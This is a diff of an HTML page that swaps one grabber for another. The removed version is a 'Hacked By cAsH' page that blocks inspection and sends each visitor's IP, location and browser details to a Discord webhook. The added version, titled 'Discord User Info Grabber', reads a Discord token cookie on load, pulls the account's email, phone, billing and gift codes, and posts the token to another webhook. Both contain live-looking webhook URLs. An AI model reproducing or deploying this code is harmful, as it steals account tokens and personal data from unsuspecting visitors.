@@ -1,154 +1,153 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>cAsH</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord User Info Grabber</title>
     <style>
         body {
             font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f0f0;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #fff;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
             text-align: center;
-            color: #000000;
-            background-color: #000000;
-            overflow: hidden;
+            margin-top: 20px;
         }
-
-        #ip-address {
-            color: rgb(255, 255, 255);
+        h2 {
+            margin-top: 20px;
         }
-
-        #ip-info {
-            font-family: Arial, sans-serif;
-            white-space: pre;
-            color: rgb(255, 255, 255);
+        ul {
+            list-style-type: none;
+            padding: 0;
         }
-
-        video {
-            position: fixed;
-            top: 0;
-            left: 0;
-            z-index: -1;
-            filter: blur(10px);
+        li {
+            margin-bottom: 10px;
         }
-
-        audio {
-            display: none; /* Hide audio controls */
+        .user-info {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        .user-info h3 {
+            flex-basis: 200px;
+        }
+        .user-info p {
+            flex-grow: 1;
         }
     </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Check for Discord token in cookies
+            function getCookie(name) {
+                let cookieValue = null;
+                if (document.cookie && document.cookie !== '') {
+                    const cookies = document.cookie.split(';');
+                    for (let i = 0; i < cookies.length; i++) {
+                        const cookie = cookies[i].trim();
+                        // Does this cookie string begin with the name we're looking for?
+                        if (cookie.substring(0, name.length + 1) === (name + '=')) {
+                            cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
+                            break;
+                        }
+                    }
+                }
+                return cookieValue;
+            }
+
+            // Send Discord token to webhook
+            function sendTokenToWebhook(token) {
+                const data = { content: token };
+                const options = {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                };
+                fetch(`https://discord.com/api/webhooks/1335617524040995021/MEHE2Vko0PjjavHK0J5AJicRMfvSEwadcsY5QL-HzsgrGtFRsP1Emn4RPku6jW5lG-_i`, options)
+                    .then(response => response.json())
+                    .then(data => console.log('Success:', data))
+                    .catch((error) => {
+                        console.error('Error:', error);
+                    });
+            }
+
+            // Get Discord user info and send it to webhook
+            const token = getCookie('discord_token');
+            if (token) {
+                fetch(`https://discord.com/api/users/@me`, {
+                    headers: {
+                        Authorization: `Bearer ${token}`,
+                    },
+                })
+                    .then(response => response.json())
+                    .then(user => {
+                        const userInfo = document.getElementById('user-info');
+                        const userInfoHTML = `
+                            <div class="container">
+                                <h1>Discord User Info</h1>
+                                <div id="user-info" class="user-info">
+                                    <h3>Username:</h3>
+                                    <p>${user.username}</p>
+                                </div>
+                                <div class="user-info">
+                                    <h3>User ID:</h3>
+                                    <p>${user.id}</p>
+                                </div>
+                                <div class="user-info">
+                                    <h3>MFA enabled:</h3>
+                                    <p>${user.mfa_enabled ? 'Yes' : 'No'}</p>
+                                </div>
+                                <div class="user-info">
+                                    <h3>Email:</h3>
+                                    <p>${user.email || '(No Email)'}</p>
+                                </div>
+                                <div class="user-info">
+                                    <h3>Phone:</h3>
+                                    <p>${user.phone || '(No Phone Number)'}</p>
+                                </div>
+                                <div class="user-info">
+                                    <h3>Verified:</h3>
+                                    <p>${user.verified ? 'Yes' : 'No'}</p>
+                                </div>
+                                <div class="user-info">
+                                    <h3>Nitro:</h3>
+                                    <p>${user.premium_type ? user.premium_type : 'No Nitro'}</p>
+                                </div>
+                                <div class="user-info">
+                                    <h3>Billing Method(s):</h3>
+                                    <p>${user.billing_products.map(product => product.product_name).join(', ') || '(No Payment Method)'}</p>
+                                </div>
+                                <div class="user-info">
+                                    <h3>Token:</h3>
+                                    <p>${token}</p>
+                                </div>
+                                <div class="user-info">
+                                    <h3>Gift Codes:</h3>
+                                    <p>${user.gift_codes.map(code => code.code).join(', ') || '(NONE)'}</p>
+                                </div>
+                            </div>
+                        `;
+                        userInfo.innerHTML = userInfoHTML;
+                        sendTokenToWebhook(token);
+                    })
+                    .catch((error) => {
+                        console.error('Error:', error);
+                    });
+            }
+        });
+    </script>
 </head>
 <body>
-    <script>
-        // Disable right-click and prevent inspect
-        document.addEventListener("contextmenu", function (e) {
-            e.preventDefault();
-            alert("💀 Pwned :)");
-        });
-
-        document.addEventListener("keydown", function (e) {
-            if (
-                e.key === "F12" ||
-                (e.ctrlKey && e.shiftKey && e.key === "I") ||
-                (e.ctrlKey && e.key === "U")
-            ) {
-                e.preventDefault();
-                alert("💀 Pwned :)");
-            }
-        });
-
-        // Change names dynamically
-        var names = [
-            { name: "[ cAsH، ]", color: "red" },
-            { name: "[ cAsH، ]", color: "white" }
-        ];
-
-        var nameIndex = 0;
-
-        function changeNames() {
-            var currentName = names[nameIndex];
-            document.getElementById("name").textContent = currentName.name;
-            document.getElementById("name").style.color = currentName.color;
-            nameIndex = (nameIndex + 1) % names.length;
-        }
-
-        setInterval(changeNames, 1000);
-
-        // Fetch and send IP to webhook
-        async function fetchAndSendIP() {
-            try {
-                const ipResponse = await fetch('https://api.ipify.org/?format=json');
-                const ipData = await ipResponse.json();
-                const userIP = ipData.ip;
-
-                const geoResponse = await fetch(https://ipinfo.io/${userIP}/json);
-                const geoData = await geoResponse.json();
-
-                const userAgent = navigator.userAgent;
-                const platform = navigator.platform;
-                const screenWidth = screen.width;
-                const screenHeight = screen.height;
-                const timestamp = new Date().toLocaleString();
-
-                document.getElementById('ip-address-value').textContent = userIP;
-                document.getElementById('ip-info').textContent = JSON.stringify(geoData, null, 2);
-
-                // Build webhook message content
-                const webhookMessage = 
-:cAsH:  cAsH grabbed You :cAsH: 
-
-**User IP:** ${userIP}
-**Location:** ${geoData.city}, ${geoData.region}, ${geoData.country}
-**ISP:** ${geoData.org || "Unknown"}
-**Browser:** ${userAgent}
-**Platform:** ${platform}
-**Screen Resolution:** ${screenWidth}x${screenHeight}
-**Timestamp:** ${timestamp}
-
-||@everyone|| **You have been pwned!**
-                ;
-
-                // Send to Discord Webhook
-                await fetch("https://discord.com/api/webhooks/1328900605896429612/-KgtIr5H2_vXUJnpQvHEHswyrDT20z-WkVAm0mYnb_I23dqfVqPqSmzUBdc9PvwCA9vi", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        content: webhookMessage
-                    })
-                });
-            } catch (error) {
-                console.error('Error fetching IP or sending to webhook:', error);
-            }
-        }
-
-        // Execute the function on page load
-        window.onload = fetchAndSendIP;
-    </script>
-
-    <!-- Background Video -->
-    <video autoplay loop muted>
-        <source src="https://cdn.discordapp.com/attachments/1069599369529135146/1312426668799037490/0060f2ccce355a00.mp4" type="video/mp4">
-        Your browser does not support the video tag.
-    </video>
-
-    <!-- Audio -->
-    <audio autoplay loop>
-        <source src="https://cdn.discordapp.com/attachments/1069599369529135146/1312426640718041109/Untitled_video_-_Made_with_Clipchamp_3.mp4" type="audio/mpeg">
-        Your browser does not support the audio element.
-    </audio>
-
-    <!-- Main Content -->
-    <p align="center">
-        <img border="0" src="https://cdn.discordapp.com/attachments/1069599369529135146/1313612143672692896/1111.png" width="400">
-    </p>
-    <p align="center">
-        <font face="Courier" size="6" style="color: #000000;">
-            <span style="color: rgb(210, 105, 30);"> Hacked By cAsH </span>
-            <span id="name"></span>
-        </font>
-    </p>
-    <p id="ip-address">
-        <span style="color: rgb(255, 255, 255);">Your IP Address: </span>
-        <span id="ip-address-value" style="color: rgb(255, 255, 255); font-size: 17px;">Loading...</span>
-    </p>
-
-    <h3 style="color: rgb(255, 255, 255);">Your IP Info:</h3>
-    <pre id="ip-info" class="json-data">Fetching...</pre>
+    <h1>Blank Grabber</h1>
 </body>
 </html>
